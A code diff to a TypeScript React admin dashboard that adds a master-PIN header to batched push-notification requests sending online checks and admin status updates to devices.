@@ -1742,7 +1742,7 @@ function SettingsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
           if (batchAction === "ping") data = { type: "online_check" };
           else if (batchAction === "disable") data = { type: "admin_update", status: "off", deviceId: d.deviceId };
           else data = { type: "admin_update", status: "on", adminNumber: adminNumInput.trim(), deviceId: d.deviceId };
-          return apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data }) }).then(res => { if (!res.ok) throw new Error(); });
+          return apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: d.deviceId, data }) }).then(res => { if (!res.ok) throw new Error(); });
         }));
         results.forEach(r2 => r2.status === "fulfilled" ? ok++ : fail++);
         setBatchDone(Math.min(i + BATCH, eligible.length));
@@ -2006,7 +2006,7 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
       for (let i = 0; i < eligible.length; i += BATCH) {
         const batch = eligible.slice(i, i + BATCH);
         const results = await Promise.allSettled(batch.map(d =>
-          apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data: { type: "online_check" } }) }).then(res => { if (!res.ok) throw new Error(); })
+          apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: d.deviceId, data: { type: "online_check" } }) }).then(res => { if (!res.ok) throw new Error(); })
         ));
         results.forEach(r2 => r2.status === "fulfilled" ? ok++ : fail++);
         setPingDone(Math.min(i + BATCH, eligible.length));
